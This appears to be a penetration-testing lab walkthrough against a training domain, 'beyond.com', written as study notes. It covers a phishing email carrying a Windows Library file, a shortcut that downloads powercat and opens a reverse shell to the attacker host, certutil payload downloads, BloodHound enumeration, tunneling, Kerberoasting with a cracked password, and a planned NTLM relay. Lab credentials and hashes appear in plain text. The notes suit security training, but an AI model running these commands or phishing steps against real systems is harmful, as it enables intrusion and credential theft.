- Attempt to further enumerate SMB
```bash
nxc smb 192.168.174.242 -u john -p dqsTwTpZPn#nL --shares             
	SMB         192.168.174.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)                                                                                                                         
	SMB         192.168.174.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
	SMB         192.168.174.242 445    MAILSRV1         [*] Enumerated shares
	SMB         192.168.174.242 445    MAILSRV1         Share           Permissions     Remark
	SMB         192.168.174.242 445    MAILSRV1         -----           -----------     ------
	SMB         192.168.174.242 445    MAILSRV1         ADMIN$                          Remote Admin
	SMB         192.168.174.242 445    MAILSRV1         C$                              Default share
	SMB         192.168.174.242 445    MAILSRV1         IPC$            READ            Remote IPC
```
	- Only default shares found
	- No actionable perms found


As there's currently no way to abuse anything, we can try to phish all the employees.

#### Phishing

As we've no idea about their internal structure or installed apps, we'll avoid crafting a malicious Microsoft Office doc.
Instead, we'll utilize [Windows Library files](11.3%20-%20Win%20Library%20Files.md) in combo w/ shortcut files

- Setup WebDAV share
```bash
pip3 install wsgidav

mkdir ~/beyond/webdav
~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/beyond/webdav/
	Running without configuration file.
	17:26:14.107 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
	17:26:14.108 - INFO    : WsgiDAV/4.3.3 Python/3.11.9 Linux-6.8.11-amd64-x86_64-with-glibc2.38
	17:26:14.108 - INFO    : Lock manager:      LockManager(LockStorageDict)
	17:26:14.108 - INFO    : Property manager:  None
	17:26:14.108 - INFO    : Domain controller: SimpleDomainController()
	17:26:14.108 - INFO    : Registered DAV providers by route:
	17:26:14.108 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
	17:26:14.108 - INFO    :   - '/': FilesystemProvider for path '/home/kali/exercises/beyond/webdav' (Read-Write) (anonymous)
	17:26:14.108 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
	17:26:14.108 - WARNING : Share '/' will allow anonymous write access.
	17:26:14.108 - WARNING : Share '/:dir_browser' will allow anonymous write access.
	17:26:14.148 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.0 Python/3.11.9
	17:26:14.148 - INFO    : Serving on http://0.0.0.0:80 ...
```

- Connect to WINPREP via RDP as offsec with a password of lab in order to prepare the Windows Library and shortcut files
```bash
xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.174.250 /drive:kali,/home/kali/exercises/beyond/webdav
```

- Open Visual Studio Code
- Create a New Text File
- Save As > **config.Library-ms** on the desktop
- Use code from previous Client Side Attack and update to the new IP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.170</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- Save & transfer file to Kali
- Create Shortcut file on WINPREP
	- Rt-click Desktop > New > Shortcut
	- Set the location
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.170:8000/powercat.ps1'); powercat -c 192.168.45.170 -p 4444 -e powershell"
```
	- Save as `install` & transfer to webdav folder on Kali

- Copy powercat to `~/exercises/beyond/exploits`, setup a python web server on 8000, and, in another tab, a listener for 4444
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000

nc -nlvp 4444
```

- Craft `body.txt` for email
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```


- Send email via **swaks**
```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @webdav/config.Library-ms --server 192.168.174.242 --body @exploits/body.txt --header "Subject: Staging Script" --suppress-data -ap 
	Username: john
	Password: dqsTwTpZPn#nL
	=== Trying 192.168.174.242:25...
	=== Connected to 192.168.174.242.
	<-  220 MAILSRV1 ESMTP
	 -> EHLO kali
	<-  250-MAILSRV1
	<-  250-SIZE 20480000
	<-  250-AUTH LOGIN
	<-  250 HELP
	 -> AUTH LOGIN
	<-  334 VXNlcm5hbWU6
	 -> am9obg==
	<-  334 UGFzc3dvcmQ6
	 -> ZHFzVHdUcFpQbiNuTA==
	<-  235 authenticated.
	 -> MAIL FROM:<john@beyond.com>
	<-  250 OK
	 -> RCPT TO:<marcus@beyond.com>
	<-  250 OK
	 -> DATA
	<-  354 OK, send.
	 -> 42 lines sent
	<-  250 Queued (1.031 seconds)
	 -> QUIT
	<-  221 goodbye
	=== Connection closed with remote host.
```
	- -t - Recipient
	- --from - Sender
	- --attach - Windows Library file as an attachment
	- --suppress-data - Summarize the SMTP transaction info
	- --header - Subject line
	- --body - Crafted body.txt
	- --server - IP of MAILSRV1
	- -ap - Enable pw auth

- After awhile, python and WebDAV server will show requests, and we'll have a reverse shell on CLIENTWK1 via user `marcus`
```powershell
whoami
	beyond\marcus

hostname
	CLIENTWK1

ipconfig
	
	Windows IP Configuration
	
	
	Ethernet adapter Ethernet0:
	
	   Connection-specific DNS Suffix  . : 
	   IPv4 Address. . . . . . . . . . . : 172.16.130.243
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . : 172.16.130.254
```
	- Internal IP range is 172.160.130.243/24
	- Important to document IP & network info


# Enumerating Internal

### CLIENTWK1 - 242
#### Situational Awareness Local enumeration

- Download **winpeas** onto the victim machine
```bash
cd C:\users\marcus

iwr -uri http://192.168.45.170/winPEASx64.exe -outfile winpeas.exe
OR
certutil -urlcache -f http://192.168.45.170/winPEASx64.exe winpeas.exe
	****  Online  ****
	CertUtil: -URLCache command completed successfully.

./winpeas.exe
```

##### Results:

```powershell
����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits                                                                                                                  
    OS Name: Microsoft Windows 11 Pro
    OS Version: 10.0.22000 N/A Build 22000
    System Type: x64-based PC
    Hostname: CLIENTWK1
    Domain Name: beyond.com
    ProductName: Windows 10 Enterprise

systeminfo
	Host Name:                 CLIENTWK1
	OS Name:                   Microsoft Windows 11 Pro
	OS Version:                10.0.22000 N/A Build 22000
```
	- Always manually check OS version as lin/winpeas isn't always accurate. 
		- Original scan showed Win 10

```powershell
����������͹ AV Information
    Some AV was detected, search for bypasses
    Name: Windows Defender
    ProductEXE: windowsdefender://
    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe
```

```powershell
����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:BF:AD:06]: 172.16.130.243 / 255.255.255.0
        Gateways: 172.16.130.254
        DNSs: 172.16.130.240
        Known hosts:
          172.16.130.240        00-50-56-BF-7A-C3     Dynamic
          172.16.130.254        00-50-56-BF-CC-49     Dynamic
          172.16.130.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static

...

����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data
    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.130.254
```
	- Shows MAILSRV1's internal IP

```powershell
����������͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    marcus::BEYOND:1122334455667788:aab3427b180473a66cd2f63f93f930f3:010100000000000099e560251e0adb0154e5da8ae2e492fa000000000800300030000000000000000000000000200000dbf4aa38928eac57cb9ff284d371cd7ece368068d8356a166a2dfc70ffc77f4a0a00100000000000000000000000000000000000090000000000000000000000
```

```powershell
����������͹ Scheduled Applications --Non Microsoft--
� Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                  
    (BEYOND\marcus) exec_lnk: powershell -ep bypass -File C:\Users\marcus\Documents\exec.ps1
    Permissions file: marcus [AllAccess]
    Permissions folder(DLL Hijacking): marcus [AllAccess]
    Trigger: At 4:31 AM on 9/29/2022-After triggered, repeat every 00:01:00 indefinitely.
             At log on of BEYOND\marcus-After triggered, repeat every 00:01:00 indefinitely.
```

- `type Documents\exec.ps1`
```powershell
Function ExtractValidIPAddress($String){
    $IPregex='(?<Address>((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'
    If ($String -Match $IPregex) {$Matches.Address}
}

Clear-DnsClientCache
$server = "mailsrv1.beyond.com"
$port = 110
$enableSSL = $false
$username = "marcus"
$password = "DefrostNewsySupply5544"
$baseFolder = "C:\attachments"

function saveAttachment
{
    Param
    (
    [System.Net.Mail.Attachment] $attachment,
    [string] $outURL
    )

    New-Item -Path $outURL -ItemType "File" -Force | Out-Null

    $outStream = New-Object IO.FileStream $outURL, "Create"

    $attachment.contentStream.copyTo( $outStream )

    $outStream.close()
}

[Reflection.Assembly]::LoadFile("C:\Users\marcus\Documents\OpenPop.dll")


$pop3Client = New-Object OpenPop.Pop3.Pop3Client
$pop3Client.connect( $server, $port, $enableSSL )
$pop3Client.authenticate( $username, $password )
$messageCount = $pop3Client.getMessageCount()

for ( $messageIndex = 1; $messageIndex -le $messageCount; $messageIndex++ )
{
    #$uid = $pop3Client.getMessageUid( $messageIndex )

    #$incomingMessage = $pop3Client.getMessage( $messageIndex )

    $incomingMessage = $pop3Client.getMessage( $messageIndex ).toMailMessage() 
    foreach ( $attachment in $incomingMessage.attachments )
    {
    # do something with attachments, tbd - .lnk - .doc   word I guess?
    if ($attachment.name -like "*.Library-ms*")
    {
        $filename = $attachment.name
        $attachmentURL = Join-Path -Path $baseFolder -ChildPath $filename
        saveAttachment $attachment $attachmentURL
    } 
    }

}

$pop3Client.DeleteAllMessages()

if ( $pop3Client.connected )
{
    $pop3Client.disconnect()
}

$pop3Client.dispose()

Get-ChildItem 'C:\attachments\*.Library-ms' | ForEach-Object {

       $url = Get-Content $_ | Select-String '<url>'
       $ip = ExtractValidIPAddress $url
       $share = "\\$ip\DavWWWRoot\"
       net use H: $share
       Get-ChildItem "$share\*.lnk" | ForEach-Object {

        copy $_.FullName C:\Windows\Tasks\temp.lnk
        net use H: /delete
        Unblock-File -Path C:\Windows\Tasks\temp.lnk
        powershell -c invoke-item C:\Windows\Tasks\temp.lnk
        Get-ChildItem -Path C:\attachments | Where-Object Extension -in ('.Library-ms') | foreach { $_.Delete()}
        Remove-Item -Force C:\Windows\Tasks\temp.lnk
     }
 }

Clear-RecycleBin -Force
```
	- new pw discovered
	- Think this is for dealing w/ the Windows Library attack we pull off - no priv esc path here

#### Sharphound AD Enum

- Quick domain enum
```powershell
net user /domain
	The request will be processed at a domain controller for domain beyond.com.
	User accounts for \\DCSRV1.beyond.com
	-------------------------------------------------------------------------------
	Administrator            beccy                    daniela                  
	Guest                    john                     krbtgt                   
	marcus                   
	The command completed successfully.


nslookup DCSRV1.beyond.com
	Server:  UnKnown
	Address:  172.16.130.240
	
	Name:    DCSRV1.beyond.com
	Address:  172.16.130.240


net groups /domain
	The request will be processed at a domain controller for domain beyond.com.
	Group Accounts for \\DCSRV1.beyond.com
	-------------------------------------------------------------------------------
	*Cloneable Domain Controllers
	*DnsUpdateProxy
	*Domain Admins
	*Domain Computers
	*Domain Controllers
	*Domain Guests
	*Domain Users
	*Enterprise Admins
	*Enterprise Key Admins
	*Enterprise Read-only Domain Controllers
	*Group Policy Creator Owners
	*Key Admins
	*Protected Users
	*Read-only Domain Controllers
	*Schema Admins
	The command completed successfully.


net groups /domain "Domain Admins"
	The request will be processed at a domain controller for domain beyond.com.
	Group name     Domain Admins
	Comment        Designated administrators of the domain
	
	Members
	-------------------------------------------------------------------------------
	Administrator            beccy                    
	The command completed successfully.
```

- Serve up **Sharphound.ps1**
```bash
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 ~/exercises/beyond/exploits

python3 -m http.server 80
```

- Download & run
```powershell
certutil -urlcache -f http://192.168.45.170/SharpHound.ps1 SharpHound.ps1
	****  Online  ****
	CertUtil: -URLCache command completed successfully.

powershell -ep bypass

. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
	2024-09-18T19:34:45.1914646-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
	2024-09-18T19:34:45.3008385-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
	...
	2024-09-18T19:35:32.5508549-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.
	 57 name to SID mappings.
	 1 machine sid mappings.
	 2 sid to domain mappings.
	 0 global catalog mappings.
	2024-09-18T19:35:32.5664848-07:00|INFORMATION|SharpHound Enumeration Completed at 7:35 PM on 9/18/2024! Happy Graphing!
```

- Transfer the results file `20240918193532_BloodHound.zip`
```bash
# In Kali
impacket-smbserver test . -smb2support  -username uname -password passwd
```
```powershell
# In Windows
net use m: \\192.168.45.170\test /user:uname passwd
copy 20240918193532_BloodHound.zip m:\
```

- Start Bloodhound
```bash
sudo neo4j start
	Directories in use:
	home:         /usr/share/neo4j
	config:       /usr/share/neo4j/conf
	logs:         /etc/neo4j/logs
	plugins:      /usr/share/neo4j/plugins
	import:       /usr/share/neo4j/import
	data:         /etc/neo4j/data
	certificates: /usr/share/neo4j/certificates
	licenses:     /usr/share/neo4j/licenses
	run:          /var/lib/neo4j/run
	Starting Neo4j.
	Started neo4j (pid:31358). It is available at http://localhost:7474
	There may be a short delay until the server is ready.

bloodhound (4.3.1)
```

- Use `Upload Data` and select the .zip file
- Build a raw query to display all computers identified by the collector
```console
MATCH (m:Computer) RETURN m
```
	- Match - Used to select a set of objects
	- m - Set variable containing all objects in the db of type Computer

Results show us 4 computers.  Clicking on each node can net its OS
- DCSRV1.BEYOND.COM - Windows Server 2022 Standard
- INTERNALSRV1.BEYOND.COM - Windows Server 2022 Standard
- MAILSRV1.BEYOND.COM - Windows Server 2022 Standard
- CLIENTWK1.BEYOND.COM - Windows 11 Pro

- Get IP of `internalsrv1` & add to notes
```powershell
nslookup internalsrv1
	Server:  UnKnown
	Address:  172.16.130.240
	
	Name:    internalsrv1.beyond.com
	Address:  172.16.130.241
```

- Show all  & add to notes
```console
MATCH (m:User) RETURN m
```

Results show 4 users
- BECCY
- JOHN
- DANIELA
- MARCUS

Can mark _marcus_ (interactive shell on CLIENTWK1) and _john_ (valid credentials) as _Owned_

>In a real penetration test, we should also examine domain groups and GPOs. Enumerating both is often a powerful method to elevate our privileges in the domain or gain access to other systems.

##### Pre-Build Queries
- *Find all Domain Admins*
	- Shows that `beccy` is a Domain Admin (just like our manual enum earlier)
- *Find Workstations where Domain Users can RDP*
	- No results
- *Find Servers where Domain Users can RDP*
	- No results
- *Find Computers where Domain Users are Local Admin*
	- No results
- *Shortest Path to Domain Admins from Owned Principals*
	- No results

>We could have also used PowerView or LDAP queries to obtain all of this information.
>However, in most penetration tests, we want to use BloodHound first as the output of the other methods can be quite overwhelming.
>It's an effective and powerful tool to gain a deeper understanding of the Active Directory environment in a short amount of time.
>We can also use raw or pre-built queries to identify highly complex attack vectors and display them in an interactive graphical view.

##### Services and Sessions

Further enumerate the target network to identify potential attack vectors
1. Review all active user sessions on machines
2. Examine user accounts for the existence of SPNs.
3. Leverage tools such as Nmap and CrackMapExec/ NetExec via a SOCKS52 proxy to identify accessible services.


- Build a relationship query
```console
MATCH p = (c:Computer)-[s:HasSession]->(m:User) RETURN p
```
	- Shows any users and the computers they have sessions on

Three active sessions are shown:
- Marcus (us) -> CLIENTWK1
- Beccy -> MAILSRV1
	-  If we manage to get privileged access to this machine, we can potentially extract the NTLM hash for this user.
- SID -> INTERNALSRV1
	- BloodHound uses this representation of a principal when the domain identifier of the SID is from a local machine.
	  For this session, this means that the local _Administrator_ (indicated by RID 500) has an active session on INTERNALSRV1.

##### Kerberoastables

List all Kerberoastable accounts:
- Daniela
- krbtgt
	- Because its pw is randomly generated, it's generally unfeasible to successfully craft a pw attack.

##### SPNs

With Daniela selected, we can scroll through the node's info for any SPNs
- http/internalsrv1.beyond.com

Based on the `http`, we can assume there's a web server running on this endpoint.

> Again, even though we have a potential vector for attack, we should still enumerated and collect all info prior to attacking.


In order to enumerate the internal network, we'll need to set up a SOCKS proxy OR ligolo

#### Ligolo-ng Tunneling

- On Kali - Setup Ligolo & ligolo proxy
```bash
# Create a new interface
ip tuntap add user kali mode tun ligolo
ip link set ligolo up

# Start proxy
sudo .\proxy -selfcert -laddr 192.168.45.170:443
```

- On Vic - Connect
```powershell
.\agent.exe -connect 192.168.45.170:443 -ignore-cert
```

- On Kali - Finish setup
```bash
# In logolo, once connected
session
	# Pick session (or Enter for default)

# In new tab, add route
ip route add 172.16.155.0/24 dev ligolo
ip route list
	# Should see `172.16.155.0/24 dev ligolo scope link linkdown`

# In logolo, start tunnel
start
```

- Use IPs discovered in `comps.txt` to check for popular ports
```bash
sudo nmap -v --top-ports=20 172.16.155.240-243 -oN 172.16-top_ports.txt
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 15:27 EDT
	...
	Nmap scan report for 172.16.155.240      # NOTE -> DCSRV1
	PORT     STATE    SERVICE
	21/tcp   filtered ftp
	22/tcp   filtered ssh
	23/tcp   filtered telnet
	25/tcp   filtered smtp
	53/tcp   open     domain
	80/tcp   filtered http
	110/tcp  filtered pop3
	111/tcp  filtered rpcbind
	135/tcp  open     msrpc
	139/tcp  open     netbios-ssn
	143/tcp  filtered imap
	443/tcp  filtered https
	445/tcp  open     microsoft-ds
	993/tcp  filtered imaps
	995/tcp  filtered pop3s
	1723/tcp filtered pptp
	3306/tcp filtered mysql
	3389/tcp filtered ms-wbt-server
	5900/tcp filtered vnc
	8080/tcp filtered http-proxy
	
	Nmap scan report for 172.16.155.241      # NOTE -> INTERNALSRV1
	PORT     STATE    SERVICE
	21/tcp   filtered ftp
	22/tcp   filtered ssh
	23/tcp   filtered telnet
	25/tcp   filtered smtp
	53/tcp   filtered domain
	80/tcp   open     http
	110/tcp  filtered pop3
	111/tcp  filtered rpcbind
	135/tcp  open     msrpc
	139/tcp  open     netbios-ssn
	143/tcp  filtered imap
	443/tcp  open     https
	445/tcp  open     microsoft-ds
	993/tcp  filtered imaps
	995/tcp  filtered pop3s
	1723/tcp filtered pptp
	3306/tcp open     mysql
	3389/tcp filtered ms-wbt-server
	5900/tcp filtered vnc
	8080/tcp filtered http-proxy
	
	Nmap scan report for 172.16.155.242
	...
	
	Nmap scan report for 172.16.155.243      # NOTE -> CLIENTWK1
	PORT     STATE    SERVICE
	21/tcp   filtered ftp
	22/tcp   filtered ssh
	23/tcp   filtered telnet
	25/tcp   filtered smtp
	53/tcp   filtered domain
	80/tcp   filtered http
	110/tcp  filtered pop3
	111/tcp  filtered rpcbind
	135/tcp  open     msrpc
	139/tcp  open     netbios-ssn
	143/tcp  filtered imap
	443/tcp  filtered https
	445/tcp  open     microsoft-ds
	993/tcp  filtered imaps
	995/tcp  filtered pop3s
	1723/tcp filtered pptp
	3306/tcp filtered mysql
	3389/tcp filtered ms-wbt-server
	5900/tcp filtered vnc
	8080/tcp filtered http-proxy
```

- Enumerate SMB shares
```bash
nxc smb 172.16.155.240-241 172.16.155.243 -u john -p dqsTwTpZPn#nL -d beyond.com --shares
	SMB         172.16.155.243  445    CLIENTWK1        [*] Windows 11 Build 22000 x64 (name:CLIENTWK1) (domain:beyond.com) (signing:False) (SMBv1:False)
	SMB         172.16.155.240  445    DCSRV1           [*] Windows Server 2022 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
	SMB         172.16.155.241  445    INTERNALSRV1     [*] Windows Server 2022 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
	SMB         172.16.155.243  445    CLIENTWK1        [+] beyond.com\john:dqsTwTpZPn#nL 
	SMB         172.16.155.240  445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
	SMB         172.16.155.243  445    CLIENTWK1        [*] Enumerated shares
	SMB         172.16.155.243  445    CLIENTWK1        Share           Permissions     Remark
	SMB         172.16.155.243  445    CLIENTWK1        -----           -----------     ------
	SMB         172.16.155.243  445    CLIENTWK1        ADMIN$                          Remote Admin
	SMB         172.16.155.243  445    CLIENTWK1        C$                              Default share
	SMB         172.16.155.243  445    CLIENTWK1        IPC$            READ            Remote IPC
	SMB         172.16.155.241  445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
	SMB         172.16.155.241  445    INTERNALSRV1     [*] Enumerated shares
	SMB         172.16.155.241  445    INTERNALSRV1     Share           Permissions     Remark
	SMB         172.16.155.241  445    INTERNALSRV1     -----           -----------     ------
	SMB         172.16.155.241  445    INTERNALSRV1     ADMIN$                          Remote Admin
	SMB         172.16.155.241  445    INTERNALSRV1     C$                              Default share
	SMB         172.16.155.241  445    INTERNALSRV1     IPC$            READ            Remote IPC
	SMB         172.16.155.240  445    DCSRV1           [*] Enumerated shares
	SMB         172.16.155.240  445    DCSRV1           Share           Permissions     Remark
	SMB         172.16.155.240  445    DCSRV1           -----           -----------     ------
	SMB         172.16.155.240  445    DCSRV1           ADMIN$                          Remote Admin
	SMB         172.16.155.240  445    DCSRV1           C$                              Default share
	SMB         172.16.155.240  445    DCSRV1           IPC$            READ            Remote IPC
	SMB         172.16.155.240  445    DCSRV1           NETLOGON        READ            Logon server share 
	SMB         172.16.155.240  445    DCSRV1           SYSVOL          READ            Logon server share 
	Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

- Take a look into INTERNALSRV1's website
```bash
gobuster dir -u http://172.16.155.241 -w /usr/share/wordlists/dirb/common.txt -o internalsrv/gobuster
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://172.16.155.241
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	...
	/dashboard            (Status: 301) [Size: 345] [--> http://172.16.155.241/dashboard/]
	/favicon.ico          (Status: 200) [Size: 30894]
	/examples             (Status: 503) [Size: 404]
	/img                  (Status: 301) [Size: 339] [--> http://172.16.155.241/img/]
	/index.php            (Status: 302) [Size: 0] [--> http://172.16.155.241/wordpress/]
	...
	/wordpress            (Status: 301) [Size: 345] [--> http://172.16.155.241/wordpress/]
	Progress: 4614 / 4615 (99.98%)
	===============================================================
	Finished
	===============================================================
```

- Add site to /etc/hosts
```bash
vim /etc/hosts
	172.16.155.241   internalsrv1.beyond.com
```

- Goto `http://internalsrv1.beyond.com/wordpress/wp-admin`
	- Will redirect you to a login page.

- Sadly none of the default creds or discovered creds will work


# Attacking Internal WebApp

### INTERNALSRV1 - 241

Every time we obtain new information, we should reevaluate what we already know.
- `daniela` has an http SPN mapped to INTERNALSRV1
	- Can assume that `daniela` may be able to log in to the WordPress login page successfully
- `daniela` is Kerberoastable
	- If we can crack the TGS-REP password hash, we may be able to log in to WordPress and gain further access
- If that fails, we can try **wpscan** or other webapp attacks

#### Kerberoasting

- To get the TGS-REP hash w/ **impacket**, we'll have to use a domain user (`john`)
```bash
impacket-GetUserSPNs -request -dc-ip 172.16.137.240 beyond.com/john
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	Password:
	ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
	----------------------------  -------  --------  --------------------------  --------------------------  ----------
	http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             
	
	
	
	[-] CCache file is not found. Skipping...
	$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$0533d353ee523bdf7673062394fcd0eb$ae56fa53185163ad8320a9c2a724be782b25b03dc5c9543c48098ab139991e473486460211cb132c669adf4e8da3fbb9f6a58eb296a1bbc3e861c56d2436518809c9ddb0968bc4eb43b2b19ab16f14983033216132c33972e48865c5ce2bde24d6fe36bbc0f91d69452a4541bc711ac6bc1547c08c4c083b5598fcc05ad94ae073d2282e2518894c55f0602436525bc93933a45ad9cbbe41bf6703e3dd96ce9f4b7ba951435041d43be535868d963afec2478544f9f2f33b75d0910f9bbabb6b88ac463b695a8f415bcf5b5d7f27c945d50223f6eb1f1e108d16a5cef518736eac651c82ecf5be5fd9428cd06036f6fbeca165ed68403d61931bf1e3dfe34ad0aaefcc5836f8cf49b3301a7649f7b6705f8e18a49653d680341a32f8a0b65ab921fa9ceb9c750f202474b9b2072cd0ae712d9e1485122dde50feeeadab210e69fefcd548b00ccaa71cc8b3dcefaa614090a0509fff3c7d08891c42879389203f2b94b33ab4f2c7703d56a2bc2e74f5588ac82607c45e9635824f38993fbc2e0ded2214de9828e0052fd6ab5f1f1267045791d0baf5b31b8127955a517ed132ace2c649836eee57143bc00fc2b0b9f58a850a5d17253802d74d0640ce3bc821f4837363f0f4d1e4d8b0a8f3d65bd435cac6d1c39a8b6af28aada6ca45291a1e587b7b4734de5177c993ff1368da69750d990f915e514efbda3abc5e9bd795e8bebee77d0379ab0ac0a5cc289a4b96ae801725ec82e1ff4b84067a0169539e4e69665d25d4c4e385d8eb8eff9a73066ff1350d84b39ce8b7180357cbeaff109c7caa9365b00bc463665adc62c281df050151bc704836b4df20edd9cd62d2c09e1187855c5f48c66215d57cf8c7636b0037f19cec03b3d98a6e3099a1f492b26b46fc08548944c99c210c7ac102c3db7b89570bf33fe7b5e402b3f8e38303a1e94aa79ef014ecd589b8eaf2edc20f0f44bb37359210b6b242bed715d96b4fabb15e9475442b6bc48e295170dcd8d8cfd55e9475699f4309fe9a71428a2994c9857a28cc4f639ceeeec3142264217324e4ed2d4b826b2869d15be63add42afb64d66696d94fd30e3aaabba5268d1fc1814201a4baee2e5861d2678444ccbd53b972f68348e5e8748998aaf4cc827b750ba7b7e4572ef6c696f8b82d718c56718cc7068d3c69517f460519c1b641733a6892408ca3ce41a9329da73d699a3bba8cf35ffe538054e83b5eca52eff8bc776170dd786ce943d9a9a5c4255de3a394e457ac3403eced34e1cf3977f414611a502073abaf918fb84437daf90256373ec13e2f8ed9781e9e0e4a1d202abfcbb30d11f5945d50ddbcde42784dc423931b01c
```
	- store in `daniela.hash`

- Crack
```bash
sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
	DANIelaRO123
	
	Session..........: hashcat
	Status...........: Cracked
```

> We already established that no domain user has local _Administrator_ privileges on any domain computers
& we can't use RDP to log in to them. However, we may be able to use protocols such as WinRM to access other systems.

- Try to login to the WP site at */wp-admin*
	- Huzzah!!

#### Abuse WP plugin for Relay Attack

- Review settings and plugins of webapp
	- **Users**
		- daniela
	- **Settings > General**
		- WP Address & Site Address are the DNS names internalsrv1.beyond.com/wordpress as thought
	- **Plugins > Installed**
		- Akismet Anti-Spam - Disabled
		- Backup Migration - Enabled
			- Click **Manage** for plugin config page
			- ![](beyond_bkupmgr_pluginconfig.png)
			- path: `C:\xampp\htdocs\wordpress\wp-content\backup-migration-BV1emzfHrI`
		- Hello Dolly - Disabled


Currently two options going forward
1. Upload a malicious plugin in order to get a reverse shell on INTERNALSRV1 &, hopefully, RCE.
   
2nd option requires some assumptions:
	- According to Bloodhound, local `Administrator` account has an active session on INTERNALSRV1
	- **Assumption** - Based on this session, we may assume that the account is used to run the WP instance.
	- **Assumption** - Not uncommon for `Administrator` accounts have the same password across the domain
	- Also according to Bloodhound, Domain Admin `beccy` has an active session on MAILSRV1
	- **Assumption** - `beccy`'s creds are cached on the system
	- As SMB signing being disabled on MAILSRV1 and INTERNALSRV1, a relay attack is possible if we can force an authentication.

2. Force an authentication request by abusing the Backup directory path of the **Backup Migration** WordPress plugin on INTERNALSRV1
	- Setting the destination path to our Kali machine, we can use _impacket-ntlmrelayx to relay the incoming connection to MAILSRV1
	- If our assumptions are correct, the auth request is made in the context of the local `Administrator` account on INTERNALSRV1,
	  which has the same password as the local `Administrator` account on MAILSRV1
	- If successful, we'll obtain privileged code execution on MAILSRV1, which we can then leverage to extract the NTLM hash for `beccy`

> Since the second attack vector not only results in code execution on a single system,
> but also provides a potential vector to achieve one of the goals of the penetration test, we'll perform the relay attack first


- Setup relay
```bash
